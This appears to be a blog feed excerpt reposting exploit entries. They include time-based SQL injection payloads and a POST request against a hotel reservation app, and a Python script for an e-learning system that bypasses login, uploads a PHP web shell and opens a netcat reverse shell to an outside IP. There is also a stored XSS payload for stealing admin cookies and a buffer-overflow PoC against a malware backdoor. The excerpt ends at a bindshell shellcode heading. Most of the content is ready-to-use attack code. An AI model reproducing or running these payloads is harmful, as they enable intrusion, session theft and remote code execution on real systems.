    <content type="html"><![CDATA[<h4 id="Online-Hotel-Reservation-System-1-0-SQL-Injection"><a href="#Online-Hotel-Reservation-System-1-0-SQL-Injection" class="headerlink" title="Online Hotel Reservation System 1.0 SQL Injection"></a>Online Hotel Reservation System 1.0 SQL Injection</h4><h1 id="Exploit-Title-Online-Hotel-Reservation-System-1-0-‘id’-Time-based-SQL-Injection"><a href="#Exploit-Title-Online-Hotel-Reservation-System-1-0-‘id’-Time-based-SQL-Injection" class="headerlink" title="Exploit Title: Online Hotel Reservation System 1.0 - ‘id’ Time-based SQL Injection"></a>Exploit Title: Online Hotel Reservation System 1.0 - ‘id’ Time-based SQL Injection</h1><h1 id="Exploit-Author-Mesut-Cetin"><a href="#Exploit-Author-Mesut-Cetin" class="headerlink" title="Exploit Author: Mesut Cetin"></a>Exploit Author: Mesut Cetin</h1><h1 id="Date-2021-01-14"><a href="#Date-2021-01-14" class="headerlink" title="Date: 2021-01-14"></a>Date: 2021-01-14</h1><h1 id="Vendor-Homepage-https-www-sourcecodester-com-php-13492-online-hotel-reservation-system-phpmysqli-html"><a href="#Vendor-Homepage-https-www-sourcecodester-com-php-13492-online-hotel-reservation-system-phpmysqli-html" class="headerlink" title="Vendor Homepage: https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html"></a>Vendor Homepage: <a href="https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html">https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html</a></h1><h1 id="Software-Link-https-www-sourcecodester-com-download-code-nid-13492-amp-title-Online-Hotel-Reservation-System-in-PHP-2FMySQLi-with-Source-Code"><a href="#Software-Link-https-www-sourcecodester-com-download-code-nid-13492-amp-title-Online-Hotel-Reservation-System-in-PHP-2FMySQLi-with-Source-Code" class="headerlink" title="Software Link: https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP%2FMySQLi+with+Source+Code"></a>Software Link: <a href="https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP/MySQLi+with+Source+Code">https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP%2FMySQLi+with+Source+Code</a></h1><h1 id="Version-1-0"><a href="#Version-1-0" class="headerlink" title="Version: 1.0"></a>Version: 1.0</h1><h1 id="Tested-on-Kali-Linux-2020-4-PHP-7-4-13-mysqlnd-7-4-13-Apache-2-4-46-Unix-OpenSSL-1-1-1h-mod-perl-2-0-11-Perl-v5-32-0"><a href="#Tested-on-Kali-Linux-2020-4-PHP-7-4-13-mysqlnd-7-4-13-Apache-2-4-46-Unix-OpenSSL-1-1-1h-mod-perl-2-0-11-Perl-v5-32-0" class="headerlink" title="Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0"></a>Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0</h1><p>######## Description ########</p><p>Vulnerable to SQL Injection. </p><p>// vulnerable parameter at include/room.php, line 25:</p><p>$mydb-&gt;setQuery(“SELECT * FROM “.self::$tbl_name.” Where <code>ROOMID</code>= {id} LIMIT 1”);</p><p>######## Proof of Concept #########</p><p>The ‘id’ parameter at <a href="http://localhost/marimar/admin/mod_room/index.php?view=edit&amp;id=11">http://localhost/marimar/admin/mod_room/index.php?view=edit&amp;id=11</a> is vulnerable to time-based SQL injection.</p><p>Payload: (select*from(select(sleep(10)))a)</p><p>Proof of Concept:</p><p><a href="http://localhost/marimar/admin/mod_room/index.php?view=edit&amp;id=(select*from(select(sleep(10)))a">http://localhost/marimar/admin/mod_room/index.php?view=edit&amp;id=(select*from(select(sleep(10)))a</a>)</p><h1 id="Exploit-Title-Online-Hotel-Reservation-System-1-0-‘person’-time-based-SQL-Injection"><a href="#Exploit-Title-Online-Hotel-Reservation-System-1-0-‘person’-time-based-SQL-Injection" class="headerlink" title="Exploit Title: Online Hotel Reservation System 1.0 - ‘person’ time-based SQL Injection"></a>Exploit Title: Online Hotel Reservation System 1.0 - ‘person’ time-based SQL Injection</h1><h1 id="Exploit-Author-Mesut-Cetin-1"><a href="#Exploit-Author-Mesut-Cetin-1" class="headerlink" title="Exploit Author: Mesut Cetin"></a>Exploit Author: Mesut Cetin</h1><h1 id="Date-2021-01-15"><a href="#Date-2021-01-15" class="headerlink" title="Date: 2021-01-15"></a>Date: 2021-01-15</h1><h1 id="Vendor-Homepage-https-www-sourcecodester-com-php-13492-online-hotel-reservation-system-phpmysqli-html-1"><a href="#Vendor-Homepage-https-www-sourcecodester-com-php-13492-online-hotel-reservation-system-phpmysqli-html-1" class="headerlink" title="Vendor Homepage: https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html"></a>Vendor Homepage: <a href="https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html">https://www.sourcecodester.com/php/13492/online-hotel-reservation-system-phpmysqli.html</a></h1><h1 id="Software-Link-https-www-sourcecodester-com-download-code-nid-13492-amp-title-Online-Hotel-Reservation-System-in-PHP-2FMySQLi-with-Source-Code-1"><a href="#Software-Link-https-www-sourcecodester-com-download-code-nid-13492-amp-title-Online-Hotel-Reservation-System-in-PHP-2FMySQLi-with-Source-Code-1" class="headerlink" title="Software Link: https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP%2FMySQLi+with+Source+Code"></a>Software Link: <a href="https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP/MySQLi+with+Source+Code">https://www.sourcecodester.com/download-code?nid=13492&amp;title=Online+Hotel+Reservation+System+in+PHP%2FMySQLi+with+Source+Code</a></h1><h1 id="Version-1-0-1"><a href="#Version-1-0-1" class="headerlink" title="Version: 1.0"></a>Version: 1.0</h1><h1 id="Tested-on-Kali-Linux-2020-4-PHP-7-4-13-mysqlnd-7-4-13-Apache-2-4-46-Unix-OpenSSL-1-1-1h-mod-perl-2-0-11-Perl-v5-32-0-1"><a href="#Tested-on-Kali-Linux-2020-4-PHP-7-4-13-mysqlnd-7-4-13-Apache-2-4-46-Unix-OpenSSL-1-1-1h-mod-perl-2-0-11-Perl-v5-32-0-1" class="headerlink" title="Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0"></a>Tested on: Kali Linux 2020.4, PHP 7.4.13, mysqlnd 7.4.13, Apache/2.4.46 (Unix), OpenSSL/1.1.1h, mod_perl/2.0.11 Perl/v5.32.0</h1><p>######## Description ########</p><p>The ‘person’ parameter is vulnerable to time-based SQL Injection. </p><p>######## Proof of Concept #######</p><p>Payload: (select*from(select(sleep(10)))a)</p><p>Using Burp Suite, send the following POST request:</p><p>POST /marimar/index.php?p=booking HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: de,en-US;q=0.7,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 71<br>Origin: <a href="http://localhost/">http://localhost</a><br>Connection: close<br>Referer: <a href="http://localhost/marimar/index.php?p=booking">http://localhost/marimar/index.php?p=booking</a><br>Cookie: PHPSESSID=cf40af0022f401c8cfd0be17fc00a6cc<br>Upgrade-Insecure-Requests: 1</p><p>arrival=01%2F19%2F2021&amp;departure=01%2F11%2F2021&amp;person=(select*from(select(sleep(10)))a)&amp;accomodation=0</p>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>E-Learning System 1.0 SQL Injection / Shell Upload</title>
    <link href="/2021/01/16/E-Learning-System-1-0-SQL-Injection-Shell-Upload/"/>
    <url>/2021/01/16/E-Learning-System-1-0-SQL-Injection-Shell-Upload/</url>
    
    <content type="html"><![CDATA[<h4 id="E-Learning-System-1-0-SQL-Injection-Shell-Upload"><a href="#E-Learning-System-1-0-SQL-Injection-Shell-Upload" class="headerlink" title="E-Learning System 1.0 SQL Injection / Shell Upload"></a>E-Learning System 1.0 SQL Injection / Shell Upload</h4><p>E-Learning System version 1.0 suffers from a remote SQL injection vulnerability that allows for authentication bypass and also suffers from remote code execution via file upload functionality.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#Step 1: run the exploit in python with this command: python3 exploit.py</span><br><span class="hljs-comment">#Step 2: Input the URL of the vulnerable application: Example: http://10.10.10.23/caiwl/</span><br><span class="hljs-comment">#Step 3: Input your LHOST where you want the reverse shell: Example: 10.9.192.23</span><br><span class="hljs-comment">#Step 4: Input your LPORT that is the port where the reverse shell will spawn: Example: 4444</span><br><span class="hljs-comment">#Step 5: Start a Netcat Listener on the port specified in Step 4 using this command: nc -lnvp 4444</span><br><span class="hljs-comment">#Step 6: Hit enter on the  if your Netcat Listener is ready, and you will get a reverse shell as soon as you hit enter.</span><br><br><span class="hljs-keyword">import</span> requests<br><br>print(<span class="hljs-string">&#x27;########################################################&#x27;</span>)<br>print(<span class="hljs-string">&#x27;##                 E-LEARNING SYSTEM 1.0              ##&#x27;</span>)<br>print(<span class="hljs-string">&#x27;##   AUTHENTICATION BYPASS &amp; REMOTE CODE EXECUTION    ##&#x27;</span>)<br>print(<span class="hljs-string">&#x27;########################################################&#x27;</span>)<br><br>GREEN =  <span class="hljs-string">&#x27;\033[32m&#x27;</span> <span class="hljs-comment"># Green Text</span><br>RED =  <span class="hljs-string">&#x27;\033[31m&#x27;</span> <span class="hljs-comment"># Red Text</span><br>RESET = <span class="hljs-string">&#x27;\033[m&#x27;</span> <span class="hljs-comment"># reset to the defaults</span><br><span class="hljs-comment">#Create a new session</span><br>s = requests.Session() <br>  <br><span class="hljs-comment">#Set Cookie</span><br>cookies = &#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: <span class="hljs-string">&#x27;d794ba06fcba883d6e9aaf6e528b0733&#x27;</span>&#125;<br><br>LINK=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter URL of The Vulnarable Application : &quot;</span>)<br><br><span class="hljs-comment">#Authentication Bypass</span><br>print(<span class="hljs-string">&quot;[*]Attempting Authentication Bypass...&quot;</span>)<br>values = &#123;<span class="hljs-string">&quot;user_email&quot;</span>:<span class="hljs-string">&quot;&#x27;or 1 or&#x27;&quot;</span>, <span class="hljs-string">&quot;user_pass&quot;</span>:<span class="hljs-string">&quot;lol&quot;</span>,<span class="hljs-string">&quot;btnLogin&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br>r=s.post(LINK+<span class="hljs-string">&#x27;admin/login.php&#x27;</span>, data=values, cookies=cookies) <br><br>r=s.post(LINK+<span class="hljs-string">&#x27;admin/login.php&#x27;</span>, data=values, cookies=cookies) <br><br><span class="hljs-comment">#Check if Authentication was bypassed or not.</span><br>logged_in = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;You login as Administrator.&quot;</span> <span class="hljs-keyword">in</span> r.text) <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br>l=logged_in<br><span class="hljs-keyword">if</span> l:<br>  print(GREEN+<span class="hljs-string">&quot;[+]Authentication Bypass Successful!&quot;</span>, RESET)<br><span class="hljs-keyword">else</span>:<br>  print(RED+<span class="hljs-string">&quot;[-]Failed To Authenticate!&quot;</span>, RESET)<br><br><br><span class="hljs-comment">#Creating a PHP Web Shell</span><br><br>phpshell  = &#123;<br>               <span class="hljs-string">&#x27;file&#x27;</span>: <br>                  (<br>                   <span class="hljs-string">&#x27;shell.php&#x27;</span>, <br>                   <span class="hljs-string">&#x27;&lt;?php echo shell_exec($_REQUEST[&quot;cmd&quot;]); ?&gt;&#x27;</span>, <br>                   <span class="hljs-string">&#x27;application/x-php&#x27;</span>, <br>                  &#123;<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>: <span class="hljs-string">&#x27;form-data&#x27;</span>&#125;<br>                  ) <br>             &#125;<br><br><span class="hljs-comment"># Defining value for form data</span><br>data = &#123;<span class="hljs-string">&#x27;LessonChapter&#x27;</span>:<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;LessonTitle&#x27;</span>:<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;Category&#x27;</span>:<span class="hljs-string">&#x27;Docs&#x27;</span>,<span class="hljs-string">&#x27;save&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;<br><br><br><br><span class="hljs-comment">#Uploading Reverse Shell</span><br>print(<span class="hljs-string">&quot;[*]Uploading PHP Shell For RCE...&quot;</span>)<br>upload = s.post(LINK+<span class="hljs-string">&#x27;/admin/modules/lesson/controller.php?action=add&#x27;</span>, cookies=cookies, files=phpshell, data=data, verify=<span class="hljs-literal">False</span>)<br><br>shell_upload = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;window.location=&#x27;index.php&#x27;&quot;</span> <span class="hljs-keyword">in</span> upload.text) <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br>u=shell_upload<br><span class="hljs-keyword">if</span> u:<br>  print(GREEN+<span class="hljs-string">&quot;[+]PHP Shell has been uploaded successfully!&quot;</span>, RESET)<br><span class="hljs-keyword">else</span>:<br>  print(RED+<span class="hljs-string">&quot;[-]Failed To Upload The PHP Shell!&quot;</span>, RESET)<br><br>print(<span class="hljs-string">&quot;[*]Please Input Reverse Shell Details&quot;</span>)<br>LHOST=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[*]LHOST : &quot;</span>)<br>LPORT=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[*]LPORT : &quot;</span>)<br><br>print(<span class="hljs-string">&#x27;[*]Start Your Netcat Listener With This Command : nc -lvnp &#x27;</span>+LPORT)<br><span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[*]Hit Enter if your netcat shell is ready. &#x27;</span>)<br>print(<span class="hljs-string">&#x27;[+]Deploying The Web Shell...&#x27;</span>)<br><br><br><span class="hljs-comment">#Executing The Webshell</span><br>e=s.get(<span class="hljs-string">&#x27;http://192.168.1.5/caiwl/admin/modules/lesson/files/shell.php?cmd=nc 192.168.1.2 9999 -e /bin/bash&#x27;</span>, cookies=cookies)<br><br>exit()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
      <tag>Shell Upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Alumni Management System 1.0 Cross Site Scripting</title>
    <link href="/2021/01/16/Alumni-Management-System-1-0-Cross-Site-Scripting/"/>
    <url>/2021/01/16/Alumni-Management-System-1-0-Cross-Site-Scripting/</url>
    
    <content type="html"><![CDATA[<h4 id="Alumni-Management-System-1-0-Cross-Site-Scripting"><a href="#Alumni-Management-System-1-0-Cross-Site-Scripting" class="headerlink" title="Alumni Management System 1.0 Cross Site Scripting"></a>Alumni Management System 1.0 Cross Site Scripting</h4><p>Step 1. Go to sign up page</p><p>Step 2. In the “Last Name” field, use the following XSS payload<br>“&gt;<img src=xx onerror=alert(document.cookie)> as the name and click on save.</p><p>Step 3. This should trigger the Stored XSS payload in admin panel users tab, once the admin login into the application to verify the registered users email address. The attacker steals the admin session cookie</p>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>poc</tag>
      
      <tag>Cross Site Scripting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Backdoor.Win32.Ncx.bt Remote Stack Buffer Overflow</title>
    <link href="/2021/01/16/Backdoor-Win32-Ncx-bt-Remote-Stack-Buffer-Overflow/"/>
    <url>/2021/01/16/Backdoor-Win32-Ncx-bt-Remote-Stack-Buffer-Overflow/</url>
    
    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Ncx-bt-Remote-Stack-Buffer-Overflow"><a href="#Backdoor-Win32-Ncx-bt-Remote-Stack-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.Ncx.bt Remote Stack Buffer Overflow"></a>Backdoor.Win32.Ncx.bt Remote Stack Buffer Overflow</h4><p>Backdoor.Win32.Ncx.bt malware suffers from a remote stack buffer overflow vulnerability.</p><p>Threat: Backdoor.Win32.Ncx.bt<br>Vulnerability: Remote Stack Buffer Overflow<br>Description: The malware listens on TCP port 42, sending a single HTTP GET request with a packet size of 10140 bytes, will trigger the buffer overflow overwriting both EIP and structured exception handler (SEH).<br>Type: PE32<br>MD5: ad5c01b3e6d0254adfe0898c6d16f927<br>Vuln ID: MVID-2021-0026<br>Dropped files:<br>ASLR: False<br>DEP: False<br>Safe SEH: True<br>Disclosure: 01/15/2021</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">Memory Dump:<br>EAX : 00000000<br>EBX : 00000000<br>ECX : 41414141<br>EDX : 773E9D70     ntdll.773E9D70<br>EBP : 03301680<br>ESP : 03301660<br>ESI : 00000000<br>EDI : 00000000<br>EIP : 41414141<br><br>This dump file has an exception of interest stored in it.<br>The stored exception information can be accessed via .ecxr.<br>(1ef8.1d94): Access violation - code c0000005 (first/second chance not available)<br>eax=00000000 ebx=00000000 ecx=41414141 edx=773e9d70 esi=00000000 edi=00000000<br>eip=41414141 esp=030b1660 ebp=030b1680 iopl=0         nv up ei pl zr na pe nc<br>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246<br>41414141 ??              ???<br><br><br>0:003&gt; !analyze -v<br>*******************************************************************************<br>*                                                                             *<br>*                        Exception Analysis                                   *<br>*                                                                             *<br>*******************************************************************************<br><br>*** WARNING: Unable to verify checksum for Backdoor.Win32.Ncx.bt.ad5c01b3e6d0254adfe0898c6d16f927.exe<br>*** ERROR: Module load completed but symbols could not be loaded for Backdoor.Win32.Ncx.bt.ad5c01b3e6d0254adfe0898c6d16f927.exe<br><br>FAULTING_IP: <br>Backdoor_Win32_Ncx_bt_ad5c01b3e6d0254adfe0898c6d16f927+1555<br>00401555 88443418        mov     byte ptr [esp+esi+18h],al<br><br>EXCEPTION_RECORD:  031af9f4 -- (.exr 0x31af9f4)<br>ExceptionAddress: 00401555 (Backdoor_Win32_Ncx_bt_ad5c01b3e6d0254adfe0898c6d16f927+0x00001555)<br>   ExceptionCode: c0000005 (Access violation)<br>  ExceptionFlags: 00000000<br>NumberParameters: 2<br>   Parameter[0]: 00000001<br>   Parameter[1]: 031b0000<br>Attempt to write to address 031b0000<br><br>PROCESS_NAME:  Backdoor.Win32.Ncx.bt.ad5c01b3e6d0254adfe0898c6d16f927.exe<br><br>ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.<br><br>EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.<br><br>EXCEPTION_PARAMETER1:  00000008<br><br>EXCEPTION_PARAMETER2:  41414141<br><br>WRITE_ADDRESS:  41414141 <br><br>FOLLOWUP_IP: <br>Backdoor_Win32_Ncx_bt_ad5c01b3e6d0254adfe0898c6d16f927+1555<br>00401555 88443418        mov     byte ptr [esp+esi+18h],al<br><br>FAILED_INSTRUCTION_ADDRESS: <br>+1555<br>41414141 ??              ???<br><br>MOD_LIST: &lt;ANALYSIS/&gt;<br><br>NTGLOBALFLAG:  0<br><br>APPLICATION_VERIFIER_FLAGS:  0<br><br>IP_ON_HEAP:  02870d50<br>The fault address in not in any loaded module, please check your build&#x27;s rebase<br>log at &lt;releasedir&gt;\bin\build_logs\timebuild\ntrebase.log for module which may<br>contain the address if it were loaded.<br><br>IP_IN_FREE_BLOCK: 41414141<br><br>CONTEXT:  031afa44 -- (.cxr 0x31afa44)<br>eax=00000041 ebx=76e8e250 ecx=396e055e edx=031afdc4 esi=00000144 edi=02870d50<br>eip=00401555 esp=031afea4 ebp=73c31e90 iopl=0         nv up ei pl nz na po nc<br>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202<br>Backdoor_Win32_Ncx_bt_ad5c01b3e6d0254adfe0898c6d16f927+0x1555:<br>00401555 88443418        mov     byte ptr [esp+esi+18h],al  ss:002b:031b0000=??<br>Resetting default scope<br><br>FAULTING_THREAD:  ffffffff<br><br>BUGCHECK_STR:  APPLICATION_FAULT_STACK_OVERFLOW_SOFTWARE_NX_FAULT_INVALID_EXPLOITABLE_FILL_PATTERN_41414141<br><br>PRIMARY_PROBLEM_CLASS:  STACK_OVERFLOW_INVALID_EXPLOITABLE_FILL_PATTERN_41414141<br><br>DEFAULT_BUCKET_ID:  STACK_OVERFLOW_INVALID_EXPLOITABLE_FILL_PATTERN_41414141<br><br>LAST_CONTROL_TRANSFER:  from 02870d50 to 00401555<br><br>FRAME_ONE_INVALID: 1<br><br>STACK_TEXT:  <br>031afea4 00401555 backdoor_win32_ncx_bt+0x1555<br>031afea8 02870d50 unknown!unknown+0x0<br><br><br>STACK_COMMAND:  .cxr 00000000031AFA44 ; kb ; dds 31afea4 ; kb<br><br>SYMBOL_STACK_INDEX:  0<br><br>SYMBOL_NAME:  backdoor_win32_ncx_bt+1555<br><br>FOLLOWUP_NAME:  MachineOwner<br><br>MODULE_NAME: Backdoor_Win32_Ncx_bt_ad5c01b3e6d0254adfe0898c6d16f927<br><br>IMAGE_NAME:  Backdoor.Win32.Ncx.bt.ad5c01b3e6d0254adfe0898c6d16f927.exe<br><br>DEBUG_FLR_IMAGE_TIMESTAMP:  34ae8eb9<br><br>BUCKET_ID:  APPLICATION_FAULT_STACK_OVERFLOW_SOFTWARE_NX_FAULT_INVALID_EXPLOITABLE_FILL_PATTERN_41414141_BAD_IP_backdoor_win32_ncx_bt+1555<br><br>FAILURE_BUCKET_ID:  STACK_OVERFLOW_INVALID_EXPLOITABLE_FILL_PATTERN_41414141_c0000005_Backdoor.Win32.Ncx.bt.ad5c01b3e6d0254adfe0898c6d16f927.exe!Unknown<br><br>Followup: MachineOwner<br></code></pre></div></td></tr></table></figure><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">42</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    PACKET=<span class="hljs-string">&quot;GET /&quot;</span>+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">10140</span>                                                                                               <br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br>    s.send(PACKET)<br>    s.close()<br><br>    print(<span class="hljs-string">&quot;Backdoor.Win32.Ncx.bt / Remote Stack Buffer Overflow&quot;</span>)<br>    print(<span class="hljs-string">&quot;MD5: ad5c01b3e6d0254adfe0898c6d16f927&quot;</span>)<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Remote Stack Buffer Overflow</tag>
      
      <tag>poc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux/x86 Bindshell Shellcode</title>
    <link href="/2021/01/16/Linux-x86-Bindshell-Shellcode/"/>
    <url>/2021/01/16/Linux-x86-Bindshell-Shellcode/</url>
    
